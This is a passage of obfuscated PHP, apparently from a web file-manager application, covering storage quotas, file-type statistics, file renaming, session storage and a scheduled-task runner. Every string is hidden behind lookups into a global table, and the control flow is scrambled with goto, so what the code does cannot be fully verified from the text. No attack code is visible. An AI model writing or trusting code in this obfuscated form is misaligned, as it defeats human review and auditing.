a¯¹ŒÜìì: } public function userSpaceReset($Eõ…æåæîä = false) { $BŞ÷„„ =& $_SERVER[ÉóçÄÇ]; $cùã†ïÈâ = $this->where(array($BŞ÷„„[398] => self::TYPE_USER, $BŞ÷„„[478] => $Eõ…æåæîä, $BŞ÷„„[397] => 0))->sum($BŞ÷„„[77]); $cùã†ïÈâ = !$cùã†ïÈâ || $cùã†ïÈâ <= 0 ? 0 : $cùã†ïÈâ; Model($BŞ÷„„[497])->userEdit($Eõ…æåæîä, array($BŞ÷„„[1660] => $cùã†ïÈâ)); } public function targetSpaceUpdate($aáàøÙ¨…‰, $BÏ²ğŠ®Òì) { $c‡÷Òõ° =& $_SERVER[ÉóçÄÇ]; if (!$BÏ²ğŠ®Òì) { return; } if (!in_array($aáàøÙ¨…‰, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $e§›‘¨ğ¤ = $this->targetSpaceSize($aáàøÙ¨…‰, $BÏ²ğŠ®Òì); if ($aáàøÙ¨…‰ == self::TYPE_USER) { Model($c‡÷Òõ°[497])->userEdit($BÏ²ğŠ®Òì, array($c‡÷Òõ°[1660] => $e§›‘¨ğ¤)); } else { if ($aáàøÙ¨…‰ == self::TYPE_GROUP) { Model($c‡÷Òõ°[480])->groupEdit($BÏ²ğŠ®Òì, array($c‡÷Òõ°[1660] => $e§›‘¨ğ¤)); } } } public function targetSpaceSize($B¼™¼×, $bĞ’ñöî´©) { goto a¤ÙÌÒî¯Ÿ; fÓ¤ÓŒâæ­: $fœ‹³Æ¨éà = !$fœ‹³Æ¨éà || $fœ‹³Æ¨éà <= 0 ? 0 : $fœ‹³Æ¨éà; return $fœ‹³Æ¨éà; goto Eö›ã·¸ùå; a¤ÙÌÒî¯Ÿ: $Cá‘×ƒï´ƒ =& $_SERVER[ÉóçÄÇ]; $a±¸Ğ»¹Æ‰ = $this->sourceRoot($B¼™¼×, $bĞ’ñöî´©, !0); if (!$a±¸Ğ»¹Æ‰) { return 0; } goto AÈ‚‘¥Ò£ä; AÈ‚‘¥Ò£ä: $fœ‹³Æ¨éà = floatval($a±¸Ğ»¹Æ‰[$Cá‘×ƒï´ƒ[77]]); $cæÛåÓßê› = array($Cá‘×ƒï´ƒ[548] => array($Cá‘×ƒï´ƒ[507], $Cá‘×ƒï´ƒ[493] . $a±¸Ğ»¹Æ‰[$Cá‘×ƒï´ƒ[390]] . $Cá‘×ƒï´ƒ[508])); $Dìô”’ƒàì = Model($Cá‘×ƒï´ƒ[415])->field($Cá‘×ƒï´ƒ[404])->where($cæÛåÓßê›)->select(); goto Dƒé¸“Ë…; Dƒé¸“Ë…: $Dìô”’ƒàì = array_to_keyvalue($Dìô”’ƒàì, $Cá‘×ƒï´ƒ[33], $Cá‘×ƒï´ƒ[390]); $Dìô”’ƒàì = array_unique(array_filter($Dìô”’ƒàì)); if ($Dìô”’ƒàì) { $cæÛåÓßê› = array($Cá‘×ƒï´ƒ[404] => array($Cá‘×ƒï´ƒ[405], $Dìô”’ƒàì)); $fœ‹³Æ¨éà += floatval($this->where($cæÛåÓßê›)->sum($Cá‘×ƒï´ƒ[77])); } goto fÓ¤ÓŒâæ­; Eö›ã·¸ùå: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($FŸÏ ò¨‡) { return $this->fileTypeProfile($FŸÏ ò¨‡, SourceModel::TYPE_USER); } public function groupFileTypeProfile($e‡õ¨èÇà) { return $this->fileTypeProfile($e‡õ¨èÇà, SourceModel::TYPE_GROUP); } private function fileTypeProfile($AìÈê¼æÖÔ, $dºÁÒ¥¡˜) { goto AÈ¼…òª¢Õ; BäœŒ¯’êÛ: foreach ($aÒ×÷ºÉ³î as $b—®ƒ§ˆ…ø => $Cçä¨–™®) { $F²Öèèª„Ğ[$b½”¸ÒÕá¢[399]] = $this->fileTypeWhere($b—®ƒ§ˆ…ø); $d¹àéÅÇ¢[$b—®ƒ§ˆ…ø] = array($b½”¸ÒÕá¢[1968] => $Cçä¨–™®[$b½”¸ÒÕá¢[28]], $b½”¸ÒÕá¢[1969] => $this->where($F²Öèèª„Ğ)->count(), $b½”¸ÒÕá¢[543] => $this->where($F²Öèèª„Ğ)->sum($b½”¸ÒÕá¢[77])); } Cache::set($a‰‡ƒˆÇ¶Š, $d¹àéÅÇ¢, 1200); return $d¹àéÅÇ¢; goto aÃ”Ö¾Ÿš; DŸå‰¾İ…å: $d¹àéÅÇ¢ = array(); $d¹àéÅÇ¢[$b½”¸ÒÕá¢[1967]] = array($b½”¸ÒÕá¢[1968] => LNG($b½”¸ÒÕá¢[1967]), $b½”¸ÒÕá¢[1969] => $this->where($F²Öèèª„Ğ)->count(), $b½”¸ÒÕá¢[543] => $this->where($F²Öèèª„Ğ)->sum($b½”¸ÒÕá¢[77])); $aÒ×÷ºÉ³î = KodIO::fileTypeList(); goto BäœŒ¯’êÛ; A£®Àø¯: if ($F‡åšŸ‚›) { return $F‡åšŸ‚›; } $F²Öèèª„Ğ = array($b½”¸ÒÕá¢[541] => 0); if ($AìÈê¼æÖÔ != !1) { $F²Öèèª„Ğ[$b½”¸ÒÕá¢[478]] = $AìÈê¼æÖÔ; $F²Öèèª„Ğ[$b½”¸ÒÕá¢[398]] = $dºÁÒ¥¡˜; } goto DŸå‰¾İ…å; AÈ¼…òª¢Õ: $b½”¸ÒÕá¢ =& $_SERVER[ÉóçÄÇ]; $a‰‡ƒˆÇ¶Š = $b½”¸ÒÕá¢[1966] . $AìÈê¼æÖÔ . $b½”¸ÒÕá¢[70] . $dºÁÒ¥¡˜; $F‡åšŸ‚› = Cache::get($a‰‡ƒˆÇ¶Š); goto A£®Àø¯; aÃ”Ö¾Ÿš: } public function fileNameExist($cóµ‡¢È‡×, $Cé”¯º‹àØ) { $bËóÄ±Øì =& $_SERVER[ÉóçÄÇ]; $B«ŠƒÌ’ß¥ = $this->childList($cóµ‡¢È‡×); foreach ($B«ŠƒÌ’ß¥ as $Bèö»±ğÓ¡) { if ($Bèö»±ğÓ¡[$bËóÄ±Øì[28]] == $Cé”¯º‹àØ) { return $Bèö»±ğÓ¡[$bËóÄ±Øì[390]]; } if (strtolower($Bèö»±ğÓ¡[$bËóÄ±Øì[28]]) == strtolower($Cé”¯º‹àØ)) { return $Bèö»±ğÓ¡[$bËóÄ±Øì[390]]; } } return !1; } public function childList($fÚò¯º·÷) { goto e¥Ğ«ñ——ë; fÃ¯¾ªÖô·: $A‰é¦¶ÓÛÇ = array($E…Şî”Ÿ¼š[472] => intval($fÚò¯º·÷), $E…Şî”Ÿ¼š[417] => 0); $D¾·á±ÔÆ¢ = $this->where($A‰é¦¶ÓÛÇ)->select(); $D¾·á±ÔÆ¢ = $D¾·á±ÔÆ¢ ? $D¾·á±ÔÆ¢ : array(); goto E³“Ê ÜÖ; e¥Ğ«ñ——ë: $E…Şî”Ÿ¼š =& $_SERVER[ÉóçÄÇ]; $C©ª‰õŸ±¾ = $E…Şî”Ÿ¼š[1944] . $fÚò¯º·÷; if (isset(self::$cacheChildList[$C©ª‰õŸ±¾])) { return self::$cacheChildList[$C©ª‰õŸ±¾]; } goto fÃ¯¾ªÖô·; E³“Ê ÜÖ: self::$cacheChildList[$C©ª‰õŸ±¾] = $D¾·á±ÔÆ¢; foreach ($D¾·á±ÔÆ¢ as $Eˆã½¦«‹©) { $C©ª‰õŸ±¾ = $E…Şî”Ÿ¼š[432] . $Eˆã½¦«‹©[$E…Şî”Ÿ¼š[390]]; self::$cacheSourceInfo[$C©ª‰õŸ±¾] = $Eˆã½¦«‹©; } return $D¾·á±ÔÆ¢; goto B ¡Ú›„Ú; B ¡Ú›„Ú: } public function fileNameAuto($cœ—›¤’ù, $A­ Êˆ‰ô…, $cµ†¯àƒÈØ = REPEAT_RENAME, $CİŞÌÊÎ­ = false) { $A³¿ëß¾—· =& $_SERVER[ÉóçÄÇ]; $FŸã®Ä•Å² = $this->childList($cœ—›¤’ù); $C ƒ³®·¬ = array_to_keyvalue($FŸã®Ä•Å², $A³¿ëß¾—·[33], $A³¿ëß¾—·[28]); return $this->fileNameAutoGet($C ƒ³®·¬, $A­ Êˆ‰ô…, $cµ†¯àƒÈØ, $CİŞÌÊÎ­); } public function fileNameAutoGet($A•ö¸ö›™, $EÜ…´Ä‹›Ö, $cñ‚¶¹‚ìè, $cÃµˆ¯‹°) { $Eˆ¡íŠœñĞ =& $_SERVER[ÉóçÄÇ]; if ($cñ‚¶¹‚ìè == REPEAT_REPLACE || !$A•ö¸ö›™ || !in_array_not_case($EÜ…´Ä‹›Ö, $A•ö¸ö›™) || $cÃµˆ¯‹° && $cñ‚¶¹‚ìè != REPEAT_RENAME_FOLDER) { return $EÜ…´Ä‹›Ö; } if ($cñ‚¶¹‚ìè == REPEAT_SKIP) { return !1; } $fßó‹ëÏ†ï = $Eˆ¡íŠœñĞ[94] . get_path_ext($EÜ…´Ä‹›Ö); $fßó‹ëÏ†ï = $fßó‹ëÏ†ï == $Eˆ¡íŠœñĞ[94] || $cÃµˆ¯‹° ? $Eˆ¡íŠœñĞ[33] : $fßó‹ëÏ†ï; for ($fé¥ºšÛï = 1; $fé¥ºšÛï <= count($A•ö¸ö›™) + 1; $fé¥ºšÛï++) { $e“ËÌÓèËŠ = substr($EÜ…´Ä‹›Ö, 0, strlen($EÜ…´Ä‹›Ö) - strlen($fßó‹ëÏ†ï)); $c÷ØÖá®¬‘ = $e“ËÌÓèËŠ . "\50{$fé¥ºšÛï}\51{$fßó‹ëÏ†ï}"; if (!in_array_not_case($c÷ØÖá®¬‘, $A•ö¸ö›™)) { return $c÷ØÖá®¬‘; } } } } goto Bê¸¨ÀœÊï; e§õÂ³Õô: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto cÒ ŸŠŒêà; Eá²šÜ«¶: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $f˜ÛÅŒ—‹ = new self(); return $f˜ÛÅŒ—‹; goto b‰ñå›Ï¯; fÄŸ¦Ô“¹: $Eóí›¢£Ó‡ = $cˆµ·ª¢Ğ[$A¾ÛÆ’Ş³…]; $f®¾‘Á×Û‹ = $cˆµ·ª¢Ğ[$EÆÌ†õ¢Š[779]]; switch ($A¾ÛÆ’Ş³…) { case $EÆÌ†õ¢Š[17]: self::$handle = Model($EÆÌ†õ¢Š[780]); break; case $EÆÌ†õ¢Š[781]: self::$handle = new CacheRedis($Eóí›¢£Ó‡, $f®¾‘Á×Û‹); break; case $EÆÌ†õ¢Š[782]: self::$handle = new CacheMemcached($Eóí›¢£Ó‡, $f®¾‘Á×Û‹); break; case $EÆÌ†õ¢Š[173]: $Eóí›¢£Ó‡[$EÆÌ†õ¢Š[75]] = $Eóí›¢£Ó‡[$EÆÌ†õ¢Š[75]] . $EÆÌ†õ¢Š[1473]; self::$handle = new CacheFile($Eóí›¢£Ó‡, $f®¾‘Á×Û‹); default: break; } goto Eá²šÜ«¶; cÒ ŸŠŒêà: $EÆÌ†õ¢Š =& $_SERVER[ÉóçÄÇ]; static $f˜ÛÅŒ—‹ = false; if ($f˜ÛÅŒ—‹) { return $f˜ÛÅŒ—‹; } goto fÑëåœ¡›ñ; d¢Š Ïê¥: if (self::$sessionSign) { } else { if (Cookie::get($fé‘®‹¾‘‚)) { self::$sessionSign = Cookie::get($fé‘®‹¾‘‚); } else { self::$sessionSign = guid(); } } Cookie::setSafe($fé‘®‹¾‘‚, self::$sessionSign, self::$sessionTime); $A¾ÛÆ’Ş³… = $cˆµ·ª¢Ğ[$EÆÌ†õ¢Š[1472]]; goto fÄŸ¦Ô“¹; fÑëåœ¡›ñ: $cˆµ·ª¢Ğ = $GLOBALS[$EÆÌ†õ¢Š[6]][$EÆÌ†õ¢Š[345]]; self::$sessionTime = $cˆµ·ª¢Ğ[$EÆÌ†õ¢Š[1470]]; $fé‘®‹¾‘‚ = isset($GLOBALS[$EÆÌ†õ¢Š[1471]]) ? $GLOBALS[$EÆÌ†õ¢Š[1471]] : SESSION_ID; goto d¢Š Ïê¥; b‰ñå›Ï¯: } public static function sign($dÀ‡Åİ»ª± = false) { $dÀ‡Åİ»ª± && (self::$sessionSign = $dÀ‡Åİ»ª±); self::init(); return self::$sessionSign; } public static function set($C¹–“ÂÅƒÖ, $Fæ¨ŞË–Šê = false) { self::init(); if (is_array($C¹–“ÂÅƒÖ)) { foreach ($C¹–“ÂÅƒÖ as $F¿ì©šõÓİ => $bŠŒå¼Îê) { array_set_value(self::$data, $F¿ì©šõÓİ, $bŠŒå¼Îê); } } else { array_set_value(self::$data, $C¹–“ÂÅƒÖ, $Fæ¨ŞË–Šê); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($bÅÜàö‘§ = false) { self::init(); if (!$bÅÜàö‘§) { return self::$data; } return array_get_value(self::$data, $bÅÜàö‘§); } public static function remove($eŞÊî°áù) { self::init(); unset(self::$data[$eŞÊî°áù]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ÉóçÄÇ][784])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto DóåèÚ¶ß‡; BÎ…˜Ä‚²²: http_close(); self::valueSet($AÑ‘ä¥ÓÖ¨[1474], $AÑ‘ä¥ÓÖ¨[86]); Hook::bind($AÑ‘ä¥ÓÖ¨[1476], $AÑ‘ä¥ÓÖ¨[1477]); goto eÊˆ„—âÔ²; eÊˆ„—âÔ²: while (!0) { self::cacheClear(); if (self::valueGet($AÑ‘ä¥ÓÖ¨[711]) != $AÑ‘ä¥ÓÖ¨[86]) { self::valueSet($AÑ‘ä¥ÓÖ¨[1474], $AÑ‘ä¥ÓÖ¨[491]); self::log($AÑ‘ä¥ÓÖ¨[1478]); die; } self::valueSet($AÑ‘ä¥ÓÖ¨[1474], $AÑ‘ä¥ÓÖ¨[86]); self::valueSet($AÑ‘ä¥ÓÖ¨[1475], time()); self::taskRunAll(); sleep(self::valueGet($AÑ‘ä¥ÓÖ¨[1479])); } goto e„’ÕÒÀ„ä; DóåèÚ¶ß‡: $AÑ‘ä¥ÓÖ¨ =& $_SERVER[ÉóçÄÇ]; if (self::valueGet($AÑ‘ä¥ÓÖ¨[711]) != $AÑ‘ä¥ÓÖ¨[86]) { return; } if (self::valueGet($AÑ‘ä¥ÓÖ¨[1474]) == $AÑ‘ä¥ÓÖ¨[86]) { $F™Àš‘İˆ = self::valueGet($AÑ‘ä¥ÓÖ¨[1475]); if (time() - $F™Àš‘İˆ > 3600 * 2) { self::restart(); } return; } goto BÎ…˜Ä‚²²; e„’ÕÒÀ„ä: } public static function restart() { $FÇŠƒ››…… =& $_SERVER[ÉóçÄÇ]; http_close(); self::valueSet($FÇŠƒ››……[711], $FÇŠƒ››……[491]); sleep(self::valueGet($FÇŠƒ››……[1479]) + 5); self::valueSet($FÇŠƒ››……[1474], $FÇŠƒ››……[491]); self::valueSet($FÇŠƒ››……[711], $FÇŠƒ››……[86]); } public static function shutdownEvent() { $AŒ©ì‘É²¹ =& $_SERVER[ÉóçÄÇ]; self::valueSet($AŒ©ì‘É²¹[1474], $AŒ©ì‘É²¹[491]); self::log($AŒ©ì‘É²¹[1480]); } public static function config($F³Ó†ÎÈ‚, $b´½»îÑ“É) { $c´èíœÁ =& $_SERVER[ÉóçÄÇ]; $Añöìîøâ› = 10; $b´½»îÑ“É = intval($b´½»îÑ“É) <= $Añöìîøâ› ? $Añöìîøâ› : intval($b´½»îÑ“É); self::valueSet($c´èíœÁ[711], $F³Ó†ÎÈ‚); self::valueSet($c´èíœÁ[1479], $b´½»îÑ“É); } private static function taskRunAll() { goto F®•ÚõÅ; aÍôİ›¹Ô¹: self::taskQueueRun($c‡êÍ–Ù·§); self::closeDatabase(); goto b•ãÊ×Ûèê; c„¸Î¡Š°—: $A§ìåÓµ¹Õ = count($e‰ô°â£Ğ); for ($C½ë‘êƒ£À = 0; $C½ë‘êƒ£À < $A§ìåÓµ¹Õ; $C½ë‘êƒ£À++) { $C¸ÑŠš·±À = $e‰ô°â£Ğ[$C½ë‘êƒ£À]; if (!$C¸ÑŠš·±À[$cĞ‡ŸÁá±[388]] || $C¸ÑŠš·±À[$cĞ‡ŸÁá±[1482]] != $cĞ‡ŸÁá±[86]) { continue; } if (!self::taskTimeCheck($C¸ÑŠš·±À)) { continue; } self::taskRun($C¸ÑŠš·±À); } Hook::trigger($cĞ‡ŸÁá±[1483]); goto aÍôİ›¹Ô¹; F®•ÚõÅ: $cĞ‡ŸÁá± =& $_SERVER[ÉóçÄÇ]; $c‡êÍ–Ù·§ = timeFloat(); $e‰ô°â£Ğ = Model($cĞ‡ŸÁá±[1481])->listData(); goto c„¸Î¡Š°—; b•ãÊ×Ûèê: } private static function taskQueueRun($D´Ö”°’°) { $c£Ì¬·Ÿòº = 10; while (!0) { $a®¢¾‚ÏßØ = TaskQueue::run(); if ($a®¢¾‚ÏßØ === !1) { break; } if (timeFloat() - $D´Ö”°’° >= $c£Ì¬·Ÿòº) { break; } } } private static function taskTimeCheck($c‘¥èî‹ìù) { goto C´åƒŸšËÉ; d ÄÉõòÀ: $EÙÊ’Ñ‡ = strtotime($B‰–æ“Ïğ[1484] . $B«ğö’Ê÷[$B‰–æ“Ïğ[1485]] . $B‰–æ“Ïğ[1486]) - strtotime($B‰–æ“Ïğ[1487]); $d†ÈÂõĞï¥ = time() - strtotime(date($B‰–æ“Ïğ[1488]) . $B‰–æ“Ïğ[1489]); $f—…ĞÜ®í· = $d†ÈÂõĞï¥ >= $EÙÊ’Ñ‡ && $d†ÈÂõĞï¥ <= $EÙÊ’Ñ‡ + 3600; goto Eâ®Şš§†µ; C´åƒŸšËÉ: $B‰–æ“Ïğ =& $_SERVER[ÉóçÄÇ]; $B«ğö’Ê÷ = json_decode($c‘¥èî‹ìù[$B‰–æ“Ïğ[195]], !0); $c¿×•·¾Æˆ = intval($c‘¥èî‹ìù[$B‰–æ“Ïğ[1475]]); goto d ÄÉõòÀ; Eâ®Şš§†µ: switch ($B«ğö’Ê÷[$B‰–æ“Ïğ[29]]) { case $B‰–æ“Ïğ[1490]: if (time() - $c¿×•·¾Æˆ < 3600 * 24 * 30) { return !1; } if ($B«ğö’Ê÷[$B‰–æ“Ïğ[1490]] == date($B‰–æ“Ïğ[1491]) && $f—…ĞÜ®í·) { return !0; } break; case $B‰–æ“Ïğ[1492]: if (time() - $c¿×•·¾Æˆ < 3600 * 24 * 7) { return !1; } $c‹éÖËŠœì = date($B‰–æ“Ïğ[1493]) == 0 ? 7 : date($B‰–æ“Ïğ[1493]); if ($B«ğö’Ê÷[$B‰–æ“Ïğ[1492]] == $c‹éÖËŠœì && $f—…ĞÜ®í·) { return !0; } break; case $B‰–æ“Ïğ[1485]: if (time() - $c¿×•·¾Æˆ < 3600 * 24) { return !1; } if ($f—…ĞÜ®í·) { return !0; } break; case $B‰–æ“Ïğ[1494]: if (time() - $c¿×•·¾Æˆ >= floatval($B«ğö’Ê÷[$B‰–æ“Ïğ[1494]]) * 60) { return !0; } break; default: break; } return !1; goto A˜±±‡êÔÚ; A˜±±‡êÔÚ: } private static function closeDatabase() { goto aĞŒÚ¹¼è; D³•ë×ŒÊ: if (!$e„æİ Ñ¸) { $e„æİ Ñ¸ = time(); } if (time() - $e„æİ Ñ¸ < $fõŞ“ŞŠ¯) { return; } $e„æİ Ñ¸ = time(); goto fñšç‰ÄÅš; aĞŒÚ¹¼è: $f„õñà¬¾¹ =& $_SERVER[ÉóçÄÇ]; static $e„æİ Ñ¸ = 0; $fõŞ“ŞŠ¯ = 1800; goto D³•ë×ŒÊ; fñšç‰ÄÅš: $b—â…¿Ã» = Model($f„õñà¬¾¹[497])->db($f„õñà¬¾¹[33]); if ($b—â…¿Ã») { $b—â…¿Ã»->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($f„õñà¬¾¹[1495], $f„õñà¬¾¹[1496]); die; } goto EÀ– áÄ‘š; EÀ– áÄ‘š: } public static function taskRun($CŠ…’­“Šå) { goto cÚ½‚Õ“ŠĞ; cÚ½‚Õ“ŠĞ: $DïåòÈ¬Ùì =& $_SERVER[ÉóçÄÇ]; self::log($DïåòÈ¬Ùì[1497] . $CŠ…’­“Šå[$DïåòÈ¬Ùì[388]] . $DïåòÈ¬Ùì[1498] . $CŠ…’­“Šå[$DïåòÈ¬Ùì[28]] . $DïåòÈ¬Ùì[1499] . $CŠ…’­“Šå[$DïåòÈ¬Ùì[1500]]); Model($DïåòÈ¬Ùì[1481])->run($CŠ…’­“Šå[$DïåòÈ¬Ùì[388]]); goto BÕĞ¥íèë; c®¤¡˜ì¤: Model($DïåòÈ¬Ùì[1501])->add(array($DïåòÈ¬Ùì[1502] => $DïåòÈ¬Ùì[33], $DïåòÈ¬Ùì[1503] => $DïåòÈ¬Ùì[491], $DïåòÈ¬Ùì[29] => $DïåòÈ¬Ùì[1504] . $CŠ…’­“Šå[$DïåòÈ¬Ùì[388]], $DïåòÈ¬Ùì[1505] => json_encode(array($DïåòÈ¬Ùì[28] => $CŠ…’­“Šå[$DïåòÈ¬Ùì[28]], $DïåòÈ¬Ùì[1506] => timeFloat() - $d×·¢Ô‡áÛ, $DïåòÈ¬Ùì[289] => $cñ¸†Èò÷)))); self::log($DïåòÈ¬Ùì[1507] . $CŠ…’­“Šå[$DïåòÈ¬Ùì[388]] . $DïåòÈ¬Ùì[1508] . $cñ¸†Èò÷); return !0; goto Dß¥ƒß‘ñ“; BÕĞ¥íèë: $d×·¢Ô‡áÛ = timeFloat(); $cñ¸†Èò÷ = $DïåòÈ¬Ùì[33]; switch ($CŠ…’­“Šå[$DïåòÈ¬Ùì[29]]) { case $DïåòÈ¬Ùì[303]: $CİâöùŞ¼ˆ = url_request($CŠ…’­“Šå[$DïåòÈ¬Ùì[1500]], $DïåòÈ¬Ùì[226], !1, !1, !1, !1, 5); $cñ¸†Èò÷ = strlen($CİâöùŞ¼ˆ); break; case $DïåòÈ¬Ùì[225]: $cñ¸†Èò÷ = Hook::apply($CŠ…’­“Šå[$DïåòÈ¬Ùì[1500]]); default: break; } goto c®¤¡˜ì¤; Dß¥ƒß‘ñ“: } private static function valueGet($D«¥¨è©Š) { $C’¼äŠİ‹ =& $_SERVER[ÉóçÄÇ]; $CğÂÕ…à±› = $C’¼äŠİ‹[1509]; $CœÇ ×©å¸ = Model($C’¼äŠİ‹[1510])->get($D«¥¨è©Š, $CğÂÕ…à±›); if (is_null($CœÇ ×©å¸)) { Model($C’¼äŠİ‹[1510])->set($C’¼äŠİ‹[1479], 10, $CğÂÕ…à±›); Model($C’¼äŠİ‹[1510])->set($C’¼äŠİ‹[711], $C’¼äŠİ‹[86], $CğÂÕ…à±›); Model($C’¼äŠİ‹[1510])->set($C’¼äŠİ‹[1474], $C’¼äŠİ‹[491], $CğÂÕ…à±›); $CœÇ ×©å¸ = Model($C’¼äŠİ‹[1510])->get($D«¥¨è©Š, $CğÂÕ…à±›); } return $CœÇ ×©å¸; } private static function valueSet($f²†Ö²‡£ë, $B”’Éİ´) { $a¹ÕÛÎÛÓ½ =& $_SERVER[ÉóçÄÇ]; return Model($a¹ÕÛÎÛÓ½[1510])->set($f²†Ö²‡£ë, $B”’Éİ´, $a¹ÕÛÎÛÓ½[1509]); } protected static function log($Føí¦†ŸÜ¥) { write_log($Føí¦†ŸÜ¥, $_SERVER[ÉóçÄÇ][1496]); } private static function cacheClear() { $b·ØØì‰¢· =& $_SERVER[ÉóçÄÇ]; $CÅÙ²­æÇŞ = Model($b·ØØì‰¢·[1510])->cacheKey($b·ØØì‰¢·[1509]); Cache::clearMemory($CÅÙ²­æÇŞ); Model($b·ØØì‰¢·[1481])->cacheClear(); } } class Task { const STATYS_STOP = "\163\x74\x6f\160"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\153\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($bËì¼÷Šåƒ, $F­Õùä„ = '', $B„ğõ‡îÙ’ = 0, $FÉ¢êÚ¤ ­ = '') { goto fá°íĞ²¦°; C§×³Ì„ó¼: $this->startAfter(); Hook::trigger($cÅ‰æ¯Ê¨ƒ[1521], $this->task); $this->task[$cÅ‰æ¯Ê¨ƒ[1514]] = timeFloat(); goto e†ô¡’†§ì; F›ó»ˆáö³: $GLOBALS[$cÅ‰æ¯Ê¨ƒ[1517]] = 1; Hook::bind($cÅ‰æ¯Ê¨ƒ[1476], array($this, $cÅ‰æ¯Ê¨ƒ[1518])); Hook::bind($cÅ‰æ¯Ê¨ƒ[1519], array($this, $cÅ‰æ¯Ê¨ƒ[1520])); goto C§×³Ì„ó¼; fá°íĞ²¦°: $cÅ‰æ¯Ê¨ƒ =& $_SERVER[ÉóçÄÇ]; if (self::get($bËì¼÷Šåƒ)) { return; } $this->task = array($cÅ‰æ¯Ê¨ƒ[388] => $bËì¼÷Šåƒ, $cÅ‰æ¯Ê¨ƒ[1511] => USER_ID, $cÅ‰æ¯Ê¨ƒ[1414] => $FÉ¢êÚ¤ ­, $cÅ‰æ¯Ê¨ƒ[29] => $F­Õùä„, $cÅ‰æ¯Ê¨ƒ[1006] => $cÅ‰æ¯Ê¨ƒ[33], $cÅ‰æ¯Ê¨ƒ[1004] => $B„ğõ‡îÙ’, $cÅ‰æ¯Ê¨ƒ[1018] => 0, $cÅ‰æ¯Ê¨ƒ[1512] => 0, $cÅ‰æ¯Ê¨ƒ[1513] => 0, $cÅ‰æ¯Ê¨ƒ[742] => timeFloat(), $cÅ‰æ¯Ê¨ƒ[741] => 0, $cÅ‰æ¯Ê¨ƒ[1514] => 0, $cÅ‰æ¯Ê¨ƒ[1515] => 0, $cÅ‰æ¯Ê¨ƒ[1516] => 0, $cÅ‰æ¯Ê¨ƒ[711] => $cÅ‰æ¯Ê¨ƒ[1474]); goto F›ó»ˆáö³; e†ô¡’†§ì: } public function end() { goto d¿†©˜…ÅÑ; d¿†©˜…ÅÑ: $Bï˜ñ¶„¶Ñ =& $_SERVER[ÉóçÄÇ]; if (!$this->task) { return; } if ($this->task[$Bï˜ñ¶„¶Ñ[1514]]) { self::valueSet($this->task[$Bï˜ñ¶„¶Ñ[388]], !1); } goto a¨–®ÎÄ‡…; a¨–®ÎÄ‡…: $F¢¥—¤õÎá = timeFloat() - $this->task[$Bï˜ñ¶„¶Ñ[742]]; self::log($Bï˜ñ¶„¶Ñ[1522] . $this->task[$Bï˜ñ¶„¶Ñ[388]] . $Bï˜ñ¶„¶Ñ[1523] . $F¢¥—¤õÎá . $Bï˜ñ¶„¶Ñ[1524]); Hook::unbind($Bï˜ñ¶„¶Ñ[1476], array($this, $Bï˜ñ¶„¶Ñ[1518])); goto BÂ„â²Ì; BÂ„â²Ì: Hook::unbind($Bï˜ñ¶„¶Ñ[1519], array($this, $Bï˜ñ¶„¶Ñ[1520])); $this->endAfter(); $this->task = !1; goto a‹¹àÓ¸Øß; a‹¹àÓ¸Øß: } public function update($dëÏê¨›‚¦ = 0, $D¤Õ¥Ç‹‰ = false) { goto C£Æ×éøÉÍ; dÚÑ¶Ÿ„³…: $this->updateAfter(); $c¸Õª·È™ˆ = 0.2; if (timeFloat() - $e’ÄÕîê†×[$B²¼øÍİÎ[1514]] < $c¸Õª·È™ˆ && !$D¤Õ¥Ç‹‰) { return; } goto d†ÁÕ¨äò»; C£Æ×éøÉÍ: $B²¼øÍİÎ =& $_SERVER[ÉóçÄÇ]; $e’ÄÕîê†× =& $this->task; if (!$e’ÄÕîê†×) { return; } goto Cñ®Æšä±; F·¾’Î³„¥: $e’ÄÕîê†×[$B²¼øÍİÎ[711]] = $c£é»ÃÄŒ“ ? $c£é»ÃÄŒ“ : $e’ÄÕîê†×[$B²¼øÍİÎ[711]]; $e’ÄÕîê†×[$B²¼øÍİÎ[1515]] = $DëÆëò‘ÑÔ[$B²¼øÍİÎ[1515]] ? $DëÆëò‘ÑÔ[$B²¼øÍİÎ[1515]] : 0; $e’ÄÕîê†×[$B²¼øÍİÎ[1514]] = timeFloat(); goto E¶¼»Ì÷Æ; Cñ®Æšä±: $e’ÄÕîê†×[$B²¼øÍİÎ[1018]] += $dëÏê¨›‚¦; $e’ÄÕîê†×[$B²¼øÍİÎ[741]] = timeFloat(); if ($e’ÄÕîê†×[$B²¼øÍİÎ[1004]]) { if ($e’ÄÕîê†×[$B²¼øÍİÎ[1004]] < $e’ÄÕîê†×[$B²¼øÍİÎ[1018]]) { $e’ÄÕîê†×[$B²¼øÍİÎ[1004]] = $e’ÄÕîê†×[$B²¼øÍİÎ[1018]]; } $FíÉÔ¯öÛç = timeFloat() - $e’ÄÕîê†×[$B²¼øÍİÎ[742]] - $e’ÄÕîê†×[$B²¼øÍİÎ[1515]]; $e’ÄÕîê†×[$B²¼øÍİÎ[1512]] = $e’ÄÕîê†×[$B²¼øÍİÎ[1018]] / $e’ÄÕîê†×[$B²¼øÍİÎ[1004]]; $e’ÄÕîê†×[$B²¼øÍİÎ[1513]] = $e’ÄÕîê†×[$B²¼øÍİÎ[1018]] / $FíÉÔ¯öÛç; if ($e’ÄÕîê†×[$B²¼øÍİÎ[1512]] > 0) { $e’ÄÕîê†×[$B²¼øÍİÎ[1516]] = $FíÉÔ¯öÛç * (1 - $e’ÄÕîê†×[$B²¼øÍİÎ[1512]]) / 